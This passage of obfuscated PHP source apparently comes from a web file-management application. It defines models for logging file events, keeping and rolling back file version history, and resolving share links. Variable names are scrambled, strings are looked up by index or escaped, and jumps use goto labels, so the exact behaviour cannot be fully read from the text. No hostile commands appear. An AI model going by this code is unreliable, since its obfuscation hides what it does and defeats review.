as $­¬éëö) { $÷ŠÜİëô = array($­¬éëö[$“õ§¼[1985]]); $ÎêÙíş¨ = explode($“õ§¼[50], trim($­¬éëö[$“õ§¼[589]], $“õ§¼[50])); if ($ÎêÙíş¨[0] == $“õ§¼[231] && count($ÎêÙíş¨) > $¨îêÌ‹) { $š›¢åİ· = array_slice($ÎêÙíş¨, $¨îêÌ‹); $÷ŠÜİëô = array_merge($÷ŠÜİëô, array_reverse($š›¢åİ·)); } $¨æÉÅŞ = array_merge($¨æÉÅŞ, $÷ŠÜİëô); } $“¾è…ä§[$—âÉî©] = array_unique($¨æÉÅŞ); return $“¾è…ä§[$—âÉî©]; } public function authTargetInfoMake($æâüì»õ) { $Óˆ×©— =& $_SERVER[«òÑğ]; $¥î¼Ê¦§ = array(); $±»³„” = array(); foreach ($æâüì»õ as $®Ë«Ÿ›Æ) { if ($®Ë«Ÿ›Æ[$Óˆ×©—[191]] == SourceModel::TYPE_USER) { $¥î¼Ê¦§[] = intval($®Ë«Ÿ›Æ[$Óˆ×©—[574]]); } else { if ($®Ë«Ÿ›Æ[$Óˆ×©—[191]] == SourceModel::TYPE_GROUP) { $±»³„”[] = intval($®Ë«Ÿ›Æ[$Óˆ×©—[574]]); } } } if ($¥î¼Ê¦§) { $¥î¼Ê¦§ = Model($Óˆ×©—[582])->userListInfo($¥î¼Ê¦§); } if ($±»³„”) { $á¯‰¼á = array($Óˆ×©—[2077] => array($Óˆ×©—[495], $±»³„”)); $±»³„” = Model($Óˆ×©—[590])->field($Óˆ×©—[2210])->where($á¯‰¼á)->select(); $±»³„” = array_to_keyvalue($±»³„”, $Óˆ×©—[1985]); } return array($Óˆ×©—[2211] => $¥î¼Ê¦§, $Óˆ×©—[2212] => $±»³„”); } public function authInfo($Å¤¤ÓÈ») { $õÙå© =& $_SERVER[«òÑğ]; if ($Å¤¤ÓÈ»[$õÙå©[2093]]) { $àß½í×Ò = Model($õÙå©[576])->listData($Å¤¤ÓÈ»[$õÙå©[2093]]); if (!$àß½í×Ò) { return !1; $èæ™õĞ’ = Model($õÙå©[576])->listData(); $¨ãñåª = array_filter_by_field($èæ™õĞ’, $õÙå©[490], $õÙå©[231]); return $¨ãñåª; } $Ù ÊıÒ† = array_field_key($àß½í×Ò, array($õÙå©[478], $õÙå©[32], $õÙå©[490], $õÙå©[2008], $õÙå©[2009])); $Ù ÊıÒ†[$õÙå©[2213]] = $Å¤¤ÓÈ»; return $Ù ÊıÒ†; } else { return array($õÙå©[496] => 0, $õÙå©[1991] => $Å¤¤ÓÈ»[$õÙå©[2157]], $õÙå©[497] => $õÙå©[12], $õÙå©[2008] => $õÙå©[2214]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\x63\145\137\x65\166\145\156\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\151\155\145", "\164\151\155\145", "\151\156\x73\x65\162\164", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\x64\145\163\143", '', "\x69\156\x73\145\162\164\x2c\165\160\x64\141\x74\145\x2c\x73\x65\154\145\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ßÔ‘ÀÂ¬, $íÛ±Õ, $Œ ’±Üß = '') { $¥¼”ã¢± =& $_SERVER[«òÑğ]; if (!$this->eventSave) { return; } $š‹†€¡­ = Model($¥¼”ã¢±[1431])->sourceInfo($ßÔ‘ÀÂ¬); if (!$š‹†€¡­) { return !1; } if ($this->isDisableEvent($š‹†€¡­, $íÛ±Õ)) { return; } if ($Œ ’±Üß && is_string($Œ ’±Üß)) { $Œ ’±Üß = array($¥¼”ã¢±[2024] => $Œ ’±Üß); } $©¶€ĞŒ» = defined($¥¼”ã¢±[2215]) ? USER_ID : 0; $©ºœéÊŞ = array($¥¼”ã¢±[494] => $ßÔ‘ÀÂ¬, $¥¼”ã¢±[2216] => $š‹†€¡­[$¥¼”ã¢±[193]], $¥¼”ã¢±[2217] => $š‹†€¡­[$¥¼”ã¢±[32]], $¥¼”ã¢±[587] => !empty($š‹†€¡­[$¥¼”ã¢±[587]]) ? $š‹†€¡­[$¥¼”ã¢±[587]] : $¥¼”ã¢±[12], $¥¼”ã¢±[1775] => $©¶€ĞŒ», $¥¼”ã¢±[499] => $íÛ±Õ, $¥¼”ã¢±[1777] => $Œ ’±Üß); $this->addSystemLog($íÛ±Õ, $©ºœéÊŞ); unset($©ºœéÊŞ[$¥¼”ã¢±[2217]], $©ºœéÊŞ[$¥¼”ã¢±[587]]); return $this->add($©ºœéÊŞ); } private function addSystemLog($í—ÚĞÃÂ, $…‡Â›şÜ) { $¡·ŞÇÏŠ =& $_SERVER[«òÑğ]; if ($í—ÚĞÃÂ == $¡·ŞÇÏŠ[2218]) { $í—ÚĞÃÂ = $…‡Â›şÜ[$¡·ŞÇÏŠ[529]][$¡·ŞÇÏŠ[2219]]; } else { if (in_array($í—ÚĞÃÂ, array($¡·ŞÇÏŠ[1964], $¡·ŞÇÏŠ[2220]))) { $í—ÚĞÃÂ = $…‡Â›şÜ[$¡·ŞÇÏŠ[529]][$¡·ŞÇÏŠ[171]]; } } $èì¹î = array_merge($…‡Â›şÜ, array($¡·ŞÇÏŠ[2221] => $…‡Â›şÜ[$¡·ŞÇÏŠ[194]], $¡·ŞÇÏŠ[2222] => $…‡Â›şÜ[$¡·ŞÇÏŠ[2222]])); Hook::trigger($¡·ŞÇÏŠ[2223], $¡·ŞÇÏŠ[2224] . $í—ÚĞÃÂ, $…‡Â›şÜ); Model($¡·ŞÇÏŠ[1928])->addLog($¡·ŞÇÏŠ[2224] . $í—ÚĞÃÂ, $èì¹î); } private function isDisableEvent($Î¡ış¤, $ÅñŠÚèŸ) { $¹ŠºŠı =& $_SERVER[«òÑğ]; if ($Î¡ış¤[$¹ŠºŠı[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÅñŠÚèŸ == $¹ŠºŠı[1953]) { return !1; } return !0; } public function eventCreate($“¯³‡ãÍ, $–Óó’Õ) { $¾œ¦€Şò =& $_SERVER[«òÑğ]; $€Ÿ†Á–¸ = Model($¾œ¦€Şò[1431])->sourceInfo($“¯³‡ãÍ); $Ø¤Ø¼Ì¤ = array($¾œ¦€Şò[2219] => $–Óó’Õ, $¾œ¦€Şò[32] => $€Ÿ†Á–¸[$¾œ¦€Şò[32]]); return $this->addEvent($“¯³‡ãÍ, $¾œ¦€Şò[2218], $Ø¤Ø¼Ì¤); } public function eventFileEdit($Šäı‰Œ²) { $€‘¾²­× =& $_SERVER[«òÑğ]; $¨®Ø¢ÏØ = array($€‘¾²­×[2225] => $_SERVER[$€‘¾²­×[2226]], $€‘¾²­×[2227] => strtolower(ACTION)); if (isset($GLOBALS[$€‘¾²­×[7]][$€‘¾²­×[2228]])) { $¨®Ø¢ÏØ[$€‘¾²­×[2228]] = $€‘¾²­×[91]; } return $this->addEvent($Šäı‰Œ², $€‘¾²­×[1954], $¨®Ø¢ÏØ); } public function eventRecycle($Œ‚±Õ¼À, $Î÷×ÁÖ±) { return $this->addEvent($Œ‚±Õ¼À, $_SERVER[«òÑğ][2220], $Î÷×ÁÖ±); } private static $_removeLast = ''; public function eventRemove($ÈõÔúÙ¤) { $ÔòîÌ®ş =& $_SERVER[«òÑğ]; self::$_removeLast = $ÈõÔúÙ¤; $¤ˆ‹ŒÑÇ = Model($ÔòîÌ®ş[1431])->sourceInfo($ÈõÔúÙ¤); $‡îöë²Ô = array_field_key($¤ˆ‹ŒÑÇ, array($ÔòîÌ®ş[194], $ÔòîÌ®ş[546], $ÔòîÌ®ş[508], $ÔòîÌ®ş[589])); $¶ø§ÒÇé = array($ÔòîÌ®ş[171] => $¤ˆ‹ŒÑÇ[$ÔòîÌ®ş[32]], $ÔòîÌ®ş[2227] => ACTION, $ÔòîÌ®ş[2229] => $‡îöë²Ô); return $this->addEvent($¤ˆ‹ŒÑÇ[$ÔòîÌ®ş[193]], $ÔòîÌ®ş[1953], $¶ø§ÒÇé); } public function eventShare($‰ØñÑÍ«, $Şğ»†Ç¿) { return $this->addEvent($‰ØñÑÍ«, $_SERVER[«òÑğ][1964], $Şğ»†Ç¿); } public function eventMove($‘€ÙÎüô, $İÖŸßññ, $ÜéÕ§Ğ°) { $·ÖÕÎºà =& $_SERVER[«òÑğ]; if (self::$_removeLast == $‘€ÙÎüô) { return; } $î¤Í˜©ß = Model($·ÖÕÎºà[1431]); $©½¿¬Â× = $î¤Í˜©ß->sourceInfo($‘€ÙÎüô); $ÃÒµÇà” = $î¤Í˜©ß->sourceInfo($İÖŸßññ); $È¥Õáøª = $î¤Í˜©ß->sourceInfo($ÜéÕ§Ğ°); $ºÀƒ¢ÒÕ = array($·ÖÕÎºà[1251] => $İÖŸßññ, $·ÖÕÎºà[2230] => $ÃÒµÇà”[$·ÖÕÎºà[32]], $·ÖÕÎºà[2206] => !empty($ÃÒµÇà”[$·ÖÕÎºà[587]]) ? $ÃÒµÇà”[$·ÖÕÎºà[587]] : $·ÖÕÎºà[12], $·ÖÕÎºà[1252] => $ÜéÕ§Ğ°, $·ÖÕÎºà[2231] => $È¥Õáøª[$·ÖÕÎºà[32]], $·ÖÕÎºà[2232] => !empty($È¥Õáøª[$·ÖÕÎºà[587]]) ? $È¥Õáøª[$·ÖÕÎºà[587]] : $·ÖÕÎºà[12]); $this->addEvent($‘€ÙÎüô, $·ÖÕÎºà[628], $ºÀƒ¢ÒÕ); $©½¿¬Â× = $î¤Í˜©ß->sourceInfo($‘€ÙÎüô); $ºÀƒ¢ÒÕ = array($·ÖÕÎºà[194] => $©½¿¬Â×[$·ÖÕÎºà[194]], $·ÖÕÎºà[32] => $©½¿¬Â×[$·ÖÕÎºà[32]]); $this->addEvent($İÖŸßññ, $·ÖÕÎºà[2233], $ºÀƒ¢ÒÕ); } public function eventCopy($’ÁÆÒ•µ) { $this->eventCreate($’ÁÆÒ•µ, $_SERVER[«òÑğ][626]); } public function eventRename($ğïµ‰¦Š, $û µşñ®, $×Õ•ùÚñ) { $µûÄÖ†Å =& $_SERVER[«òÑğ]; $áç·³›¡ = array($µûÄÖ†Å[1251] => $û µşñ®, $µûÄÖ†Å[1252] => $×Õ•ùÚñ); return $this->addEvent($ğïµ‰¦Š, $µûÄÖ†Å[1445], $áç·³›¡); } public function eventAddComment($öÒÉŞˆŠ, $å üÕ‹) { return $this->addEvent($öÒÉŞˆŠ, $_SERVER[«òÑğ][2234], $å üÕ‹); } public function eventAddDesc($Ïû±¥, $’§äåú) { return $this->addEvent($Ïû±¥, $_SERVER[«òÑğ][2235], $’§äåú); } public function listBySource($öİ¥”Ó) { $Ü‰ß¹ =& $_SERVER[«òÑğ]; $†—ïÎä² = Model($Ü‰ß¹[1431])->sourceInfo($öİ¥”Ó); $…Å¯®® = array($Ü‰ß¹[494] => $öİ¥”Ó); if ($†—ïÎä²[$Ü‰ß¹[488]] == $Ü‰ß¹[91]) { $Ğ¡¬ØÉï = Model($Ü‰ß¹[1431])->listSearchChildren($öİ¥”Ó, 20000); $Ğ¡¬ØÉï[] = $öİ¥”Ó . $Ü‰ß¹[457]; $…Å¯®® = array($Ü‰ß¹[194] => array($Ü‰ß¹[7], $Ğ¡¬ØÉï)); } $æøÈ¿‹™ = $this->where($…Å¯®®)->order($Ü‰ß¹[2236])->selectPage(); if ($æøÈ¿‹™[$Ü‰ß¹[445]][$Ü‰ß¹[446]] == 0) { $æøÈ¿‹™[$Ü‰ß¹[445]][$Ü‰ß¹[446]] = 1; $æøÈ¿‹™[$Ü‰ß¹[448]] = array(array($Ü‰ß¹[494] => $öİ¥”Ó, $Ü‰ß¹[2216] => $†—ïÎä²[$Ü‰ß¹[193]], $Ü‰ß¹[1775] => $†—ïÎä²[$Ü‰ß¹[530]], $Ü‰ß¹[499] => $Ü‰ß¹[2237], $Ü‰ß¹[500] => $†—ïÎä²[$Ü‰ß¹[234]], $Ü‰ß¹[1777] => $Ü‰ß¹[12])); } return $this->eventListParse($æøÈ¿‹™, $öİ¥”Ó); } private function eventListParse($›•âğ¾Ü, $ìñò·ÁŸ) { $¢²ñÈÏ° =& $_SERVER[«òÑğ]; $×ìÄÆ¦ü = $›•âğ¾Ü[$¢²ñÈÏ°[448]]; $Ûú£¨ = array_to_keyvalue($×ìÄÆ¦ü, $¢²ñÈÏ°[12], $¢²ñÈÏ°[194]); $Ğ‚›íá = array_to_keyvalue($×ìÄÆ¦ü, $¢²ñÈÏ°[12], $¢²ñÈÏ°[2222]); foreach ($×ìÄÆ¦ü as $¯Á•Û™‹) { $¯³Ô—²ë = $¯Á•Û™‹[$¢²ñÈÏ°[529]]; if ($¯Á•Û™‹[$¢²ñÈÏ°[33]] == $¢²ñÈÏ°[628] && isset($¯³Ô—²ë[$¢²ñÈÏ°[1251]])) { $Ûú£¨[] = $¯³Ô—²ë[$¢²ñÈÏ°[1251]] . $¢²ñÈÏ°[12]; $Ûú£¨[] = $¯³Ô—²ë[$¢²ñÈÏ°[1252]] . $¢²ñÈÏ°[12]; } if ($¯Á•Û™‹[$¢²ñÈÏ°[33]] == $¢²ñÈÏ°[2233] && isset($¯³Ô—²ë[$¢²ñÈÏ°[194]])) { $Ûú£¨[] = $¯³Ô—²ë[$¢²ñÈÏ°[194]] . $¢²ñÈÏ°[12]; } } $Ûú£¨ = array_merge($Ûú£¨, $Ğ‚›íá, array($ìñò·ÁŸ . $¢²ñÈÏ°[12])); $Ûú£¨ = array_unique($Ûú£¨); $ß²ùÃØó = array_unique(array_to_keyvalue($×ìÄÆ¦ü, $¢²ñÈÏ°[12], $¢²ñÈÏ°[1784])); $§†öÌŒ½ = Model($¢²ñÈÏ°[602])->userListInfo($ß²ùÃØó); $Ä…¼Î´Ì = Model($¢²ñÈÏ°[914])->sourceListInfo($Ûú£¨, !0); foreach ($×ìÄÆ¦ü as &$¯Á•Û™‹) { if ($¯Á•Û™‹[$¢²ñÈÏ°[33]] == $¢²ñÈÏ°[628] && isset($¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[1251]])) { $¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[1251]] = $Ä…¼Î´Ì[$¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[1251]]]; $¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[1252]] = $Ä…¼Î´Ì[$¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[1252]]]; } if ($¯Á•Û™‹[$¢²ñÈÏ°[33]] == $¢²ñÈÏ°[2233] && isset($¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[194]])) { $¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[194]] = $Ä…¼Î´Ì[$¯Á•Û™‹[$¢²ñÈÏ°[529]][$¢²ñÈÏ°[194]]]; } $¯Á•Û™‹[$¢²ñÈÏ°[90]] = $Ä…¼Î´Ì[$¯Á•Û™‹[$¢²ñÈÏ°[194]]]; $¯Á•Û™‹[$¢²ñÈÏ°[2238]] = $Ä…¼Î´Ì[$¯Á•Û™‹[$¢²ñÈÏ°[2222]]]; if ($¯Á•Û™‹[$¢²ñÈÏ°[33]] == $¢²ñÈÏ°[1953]) { $¯Á•Û™‹[$¢²ñÈÏ°[2238]] = $¯Á•Û™‹[$¢²ñÈÏ°[90]]; $¯Á•Û™‹[$¢²ñÈÏ°[2222]] = $¯Á•Û™‹[$¢²ñÈÏ°[2238]][$¢²ñÈÏ°[194]]; $¯Á•Û™‹[$¢²ñÈÏ°[90]] = !1; $¯Á•Û™‹[$¢²ñÈÏ°[194]] = $¢²ñÈÏ°[12]; } $¯Á•Û™‹[$¢²ñÈÏ°[2165]] = $§†öÌŒ½[$¯Á•Û™‹[$¢²ñÈÏ°[1784]]]; } unset($¯Á•Û™‹); $›•âğ¾Ü[$¢²ñÈÏ°[448]] = $×ìÄÆ¦ü; return $›•âğ¾Ü; } public function removeBySource($‘ùŠı¯°) { $œ²èá“¹ = array($_SERVER[«òÑğ][494] => $‘ùŠı¯°); $this->where($œ²èá“¹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145\137\150\151\x73\x74\x6f\x72\171"; public function historyCount($©Í¡Í‡Ñ) { $»ŒŒ¥ùË =& $_SERVER[«òÑğ]; if (!$©Í¡Í‡Ñ) { return array(); } if (is_string($©Í¡Í‡Ñ) || is_int($©Í¡Í‡Ñ)) { $©Í¡Í‡Ñ = array($©Í¡Í‡Ñ); } $î÷öÆÈ = array($»ŒŒ¥ùË[194], $»ŒŒ¥ùË[2239] => $»ŒŒ¥ùË[570]); $øÅæ”«« = array($»ŒŒ¥ùË[194] => array($»ŒŒ¥ùË[7], $©Í¡Í‡Ñ)); $øôÖöŸê = $this->field($î÷öÆÈ)->where($øÅæ”««)->group($»ŒŒ¥ùË[194])->select(); return array_to_keyvalue($øôÖöŸê, $»ŒŒ¥ùË[194], $»ŒŒ¥ùË[570]); } public function addHistory($“¤”­Ç¿, $°×Ò®·Ô = '') { $¸„²üñ =& $_SERVER[«òÑğ]; $™¨…‡œŞ = array($¸„²üñ[494] => $“¤”­Ç¿[$¸„²üñ[194]], $¸„²üñ[1775] => isset($“¤”­Ç¿[$¸„²üñ[532]]) ? $“¤”­Ç¿[$¸„²üñ[532]] : $“¤”­Ç¿[$¸„²üñ[530]], $¸„²üñ[547] => $“¤”­Ç¿[$¸„²üñ[546]], $¸„²üñ[625] => $“¤”­Ç¿[$¸„²üñ[79]], $¸„²üñ[2240] => $°×Ò®·Ô); if ($GLOBALS[$¸„²üñ[6]][$¸„²üñ[92]][$¸„²üñ[1312]] >= 1) { $this->historyAutoClear($™¨…‡œŞ[$¸„²üñ[194]]); $this->add($™¨…‡œŞ); } Hook::trigger($¸„²üñ[2241], $™¨…‡œŞ); Model($¸„²üñ[2242])->eventFileEdit($“¤”­Ç¿[$¸„²üñ[194]]); } private function historyAutoClear($ˆú€ˆÕ) { $ğ ò„ş¨ =& $_SERVER[«òÑğ]; $Ô«®ùÉ· = Model($ğ ò„ş¨[854])->get($ğ ò„ş¨[1334]); $í¨ŒŸãÓ = intval($GLOBALS[$ğ ò„ş¨[6]][$ğ ò„ş¨[92]][$ğ ò„ş¨[1312]]); $‡ ’ÜŒÈ = $Ô«®ùÉ· == $ğ ò„ş¨[1335] ? min(5, $í¨ŒŸãÓ) : $í¨ŒŸãÓ; $‡ ’ÜŒÈ = $‡ ’ÜŒÈ <= 0 ? 0 : $‡ ’ÜŒÈ - 1; if ($‡ ’ÜŒÈ >= 499) { return; } $‚ßÎ»Œ = array($ğ ò„ş¨[494] => $ˆú€ˆÕ); $¦­û„ãç = $this->field($ğ ò„ş¨[2243])->where($‚ßÎ»Œ)->order($ğ ò„ş¨[2236])->select(); if (!$¦­û„ãç || $‡ ’ÜŒÈ >= count($¦­û„ãç)) { return; } $©´ÖÈ›‹ = array_to_keyvalue($¦­û„ãç, $ğ ò„ş¨[12], $ğ ò„ş¨[478]); $©´ÖÈ›‹ = array_slice($©´ÖÈ›‹, $‡ ’ÜŒÈ); $„¸½œµ¼ = array_to_keyvalue($¦­û„ãç, $ğ ò„ş¨[12], $ğ ò„ş¨[546]); $„¸½œµ¼ = array_slice($„¸½œµ¼, $‡ ’ÜŒÈ); if (!$©´ÖÈ›‹ || !$„¸½œµ¼) { return; } $‚ßÎ»Œ = array($ğ ò„ş¨[496] => array($ğ ò„ş¨[7], $©´ÖÈ›‹)); $this->where($‚ßÎ»Œ)->delete(); Model($ğ ò„ş¨[549])->remove($„¸½œµ¼); } public function listData($à¹ö‚°) { $ê‹¡éî¸ =& $_SERVER[«òÑğ]; $ºî«³Õ¯ = array($ê‹¡éî¸[494] => $à¹ö‚°); $©ü½Ç±Â = $ê‹¡éî¸[2244]; $üöúíîš = $this->field($©ü½Ç±Â)->where($ºî«³Õ¯)->order($ê‹¡éî¸[2236])->selectPage(); $this->_listAppendUser($üöúíîš[$ê‹¡éî¸[448]]); $çË¯î…Ó = Model($ê‹¡éî¸[854])->get($ê‹¡éî¸[1334]); $–®ÁÏïë = 5; if ($çË¯î…Ó == $ê‹¡éî¸[1335]) { $üöúíîš[$ê‹¡éî¸[448]] = array_slice($üöúíîš[$ê‹¡éî¸[448]], 0, $–®ÁÏïë); $üöúíîš[$ê‹¡éî¸[445]] = array($ê‹¡éî¸[2245] => 1, $ê‹¡éî¸[2246] => 20, $ê‹¡éî¸[2247] => 1, $ê‹¡éî¸[2248] => count($üöúíîš[$ê‹¡éî¸[448]])); } return $üöúíîš; } protected function _listAppendUser(&$õÄ‚¿‹ç) { $ÎÛ‚ˆ²Ê =& $_SERVER[«òÑğ]; $ü‚çÖ = array_to_keyvalue($õÄ‚¿‹ç, $ÎÛ‚ˆ²Ê[12], $ÎÛ‚ˆ²Ê[1784]); $ƒ×õõ ‘ = Model($ÎÛ‚ˆ²Ê[602])->userListInfo($ü‚çÖ); foreach ($õÄ‚¿‹ç as &$Ï¥ê£Ÿ«) { $íÜÚ ¯ = $Ï¥ê£Ÿ«[$ÎÛ‚ˆ²Ê[1784]]; $Ï¥ê£Ÿ«[$ÎÛ‚ˆ²Ê[530]] = $ƒ×õõ ‘[$íÜÚ ¯] ? $ƒ×õõ ‘[$íÜÚ ¯] : !1; } unset($Ï¥ê£Ÿ«); } public function fileInfo($®¬ŸÆ’) { $Ğ†Æ­ÑŠ =& $_SERVER[«òÑğ]; $À•½ºÓ¤ = $this->tablePrefix; $˜İÅ¡º = "{$À•½ºÓ¤}\x69\x6f\137\x66\x69\154\x65\x20\x66\x69\154\x65\x73\40\x6f\156\40\x66\x69\x6c\145\163\x2e\146\x69\x6c\x65\x49\x44\40\75\x20\x68\151\x73\164\157\x72\x79\56\x66\151\154\x65\x49\x44"; return $this->alias($Ğ†Æ­ÑŠ[2249])->where(array($Ğ†Æ­ÑŠ[496] => $®¬ŸÆ’))->join($˜İÅ¡º, $Ğ†Æ­ÑŠ[2250])->find(); } public function removeItem($«Š¶ÆÅ») { $­‡Åãì€ =& $_SERVER[«òÑğ]; $š«ûıá¿ = array($­‡Åãì€[496] => $«Š¶ÆÅ»); $ˆ±àô¬ = $this->where($š«ûıá¿)->find(); if ($ˆ±àô¬) { $©ÌáÁ†ü = $this->where($š«ûıá¿)->delete(); Model($­‡Åãì€[549])->remove($ˆ±àô¬[$­‡Åãì€[546]]); return $©ÌáÁ†ü; } return !1; } public function removeBySource($±¡…›Â¶) { $‹±åøçÙ =& $_SERVER[«òÑğ]; if (!$±¡…›Â¶) { return !1; } if (!is_array($±¡…›Â¶)) { $±¡…›Â¶ = array($±¡…›Â¶); } $çê‹áÒ× = array($‹±åøçÙ[494] => array($‹±åøçÙ[7], $±¡…›Â¶)); $¥ó’©¥¢ = $this->field($‹±åøçÙ[547])->where($çê‹áÒ×)->select(); if ($¥ó’©¥¢) { $this->where($çê‹áÒ×)->delete(); $¸’·È´¤ = array_to_keyvalue($¥ó’©¥¢, $‹±åøçÙ[12], $‹±åøçÙ[546]); Model($‹±åøçÙ[549])->remove($¸’·È´¤); } return !0; } public function setDetail($ó±Ò¶Ÿß, $éÚ­ŸÃŠ) { $—òì˜…× =& $_SERVER[«òÑğ]; return $this->where(array($—òì˜…×[496] => $ó±Ò¶Ÿß))->save(array($—òì˜…×[2240] => $éÚ­ŸÃŠ)); } public function rollbackToItem($Û­¡¹åú, $¥­ı†øı) { $—“ØíüÒ =& $_SERVER[«òÑğ]; $Ò²ßòË = Model($—“ØíüÒ[914])->sourceInfo($Û­¡¹åú); $this->addHistory($Ò²ßòË, LNG($—“ØíüÒ[2251])); $ªÆ×•¿© = $this->find($¥­ı†øı); $Œ¦…Ò¿ = array($—“ØíüÒ[546] => $ªÆ×•¿©[$—“ØíüÒ[546]], $—“ØíüÒ[79] => $ªÆ×•¿©[$—“ØíüÒ[79]], $—“ØíüÒ[88] => time(), $—“ØíüÒ[532] => USER_ID); Model($—“ØíüÒ[914])->where(array($—“ØíüÒ[194] => $Û­¡¹åú))->save($Œ¦…Ò¿); return $this->where(array($—“ØíüÒ[496] => $¥­ı†øı))->delete(); } public function clearSame($ïÌ¥Ô¨‚) { $ô•Ôä“ô =& $_SERVER[«òÑğ]; $° €”ºü = $this->listData($ïÌ¥Ô¨‚); $ÖúÊ‘×Æ = array_to_keyvalue_group($° €”ºü, $ô•Ôä“ô[546]); $ó°ğ±„é = array(); $ñôèÔó = array(); foreach ($ÖúÊ‘×Æ as $‰«˜‰â) { if (!$‰«˜‰â || count($‰«˜‰â) <= 1) { continue; } foreach ($‰«˜‰â as $³ŒïÍùğ) { $ó°ğ±„é[] = $³ŒïÍùğ[$ô•Ôä“ô[546]]; $ñôèÔó[] = $³ŒïÍùğ[$ô•Ôä“ô[478]]; } } if (!$ñôèÔó) { return; } $this->where(array($ô•Ôä“ô[478] => array($ô•Ôä“ô[7], $ñôèÔó)))->delete(); Model($ô•Ôä“ô[549])->remove($ó°ğ±„é); } public function userSpace() { $ÖÉ£á¢Ô =& $_SERVER[«òÑğ]; $˜–¬çÓŠ = $this->tablePrefix; $éÅùİ¿ˆ = array($ÖÉ£á¢Ô[1775] => USER_ID); $­çÏ½â  = "{$˜–¬çÓŠ}\151\x6f\x5f\146\x69\x6c\x65\x20\x66\151\154\145\x73\x20\157\156\40\x66\x69\154\145\163\56\146\151\154\x65\x49\x44\40\x3d\x20\150\x69\163\164\157\x72\x79\x2e\146\151\154\145\111\x44"; return $this->alias($ÖÉ£á¢Ô[2249])->where($éÅùİ¿ˆ)->join($­çÏ½â , $ÖÉ£á¢Ô[2250])->sum($ÖÉ£á¢Ô[79]); } } goto ašº›ó·; f­ÌÔ–®«: define($_SERVER[«òÑğ][320], 3); define($_SERVER[«òÑğ][321], 1); define($_SERVER[«òÑğ][322], 0); goto bÍØÏ–‰´ì; e¶¤Í¤èƒ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($“ñèœÊÔ) { $this->pathParse = $“ñèœÊÔ; } protected function infoParse($éƒÂ€Åœ, $£é›½×È = false) { $ÓÖÑşƒë =& $_SERVER[«òÑğ]; return Action($ÓÖÑşƒë[1266])->sharePathInfo($this->pathParse[$ÓÖÑşƒë[87]], !0, $£é›½×È); } public function listPath($™”·ˆï, $¹Úö—åò = false) { $“š²ğØ÷ =& $_SERVER[«òÑğ]; $¾àÙş¨ = IO::listPath($™”·ˆï, $¹Úö—åò); if (!$¾àÙş¨) { return $¾àÙş¨; } if (is_array($¾àÙş¨[$“š²ğØ÷[1439]])) { $ÉÄê“ò— = Action($“š²ğØ÷[1448])->parsePathChildren($¾àÙş¨[$“š²ğØ÷[1439]], array($“š²ğØ÷[498] => $™”·ˆï)); $¾àÙş¨[$“š²ğØ÷[1439]] = Action($“š²ğØ÷[1266])->shareItemInfo($ÉÄê“ò—); } foreach ($¾àÙş¨ as $Š—˜ÁÍû => $ÜÃ¶¡üÆ) { if (!in_array($Š—˜ÁÍû, array($“š²ğØ÷[86], $“š²ğØ÷[85]))) { continue; } foreach ($ÜÃ¶¡üÆ as $¬„Öñ®µ => $ÉÄê“ò—) { $ÉÄê“ò— = Action($“š²ğØ÷[1448])->parsePathChildren($ÉÄê“ò—, array($“š²ğØ÷[498] => $™”·ˆï)); $¾àÙş¨[$Š—˜ÁÍû][$¬„Öñ®µ] = Action($“š²ğØ÷[1266])->shareItemInfo($ÉÄê“ò—); } } return $¾àÙş¨; } } $_file = $_SERVER[$_SERVER[«òÑğ][831]]; $_size = $_SERVER[«òÑğ][1449]; goto d©ÍŠ˜É¹š; CÓàÀìÌé”: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($¸€á©ö = false, $ÁÉ‹àëÜ = "\x6d\x6f\x64\151\146\171\124\x69\x6d\x65", $ÑÍ›àğ = false) { $è¥ñ‰ªŞ = Model($this->modelType)->get(!1, $this->optionType, !0); $‘´úãí£ = array_values($è¥ñ‰ªŞ); if ($‘´úãí£ && $‘´úãí£[0] && !is_array($‘´úãí£[0])) { Model($this->modelType)->cacheRemove($this->optionType); $è¥ñ‰ªŞ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$è¥ñ‰ªŞ) { return $¸€á©ö ? null : array(); } if (!$¸€á©ö) { $è¥ñ‰ªŞ = array_filter(array_values($è¥ñ‰ªŞ)); return array_sort_by($è¥ñ‰ªŞ, $ÁÉ‹àëÜ, $ÑÍ›àğ); } return $è¥ñ‰ªŞ[$_SERVER[«òÑğ][475] . $¸€á©ö]; } public function insert($¤ì¥›â§) { $×Ğâ¬Åµ =& $_SERVER[«òÑğ]; $¤ì¥›â§ = array_field_key($¤ì¥›â§, $this->field); $Ğêú ÛÄ = Model($this->modelType)->get($×Ğâ¬Åµ[476], $this->optionType . $×Ğâ¬Åµ[477]); $Ğêú ÛÄ = $Ğêú ÛÄ ? $Ğêú ÛÄ : 0; $¤ì¥›â§[$×Ğâ¬Åµ[478]] = ++$Ğêú ÛÄ; $¤ì¥›â§[$×Ğâ¬Åµ[234]] = time(); $¤ì¥›â§[$×Ğâ¬Åµ[88]] = time(); Model($this->modelType)->set($×Ğâ¬Åµ[476], $Ğêú ÛÄ, $this->optionType . $×Ğâ¬Åµ[477]); Model($this->modelType)->set($×Ğâ¬Åµ[475] . $Ğêú ÛÄ, $¤ì¥›â§, $this->optionType); return $Ğêú ÛÄ; } public function update($ôºÄ¢ˆì, $²ùîÁ¶¨) { $ßÑ¥¶¾¬ =& $_SERVER[«òÑğ]; 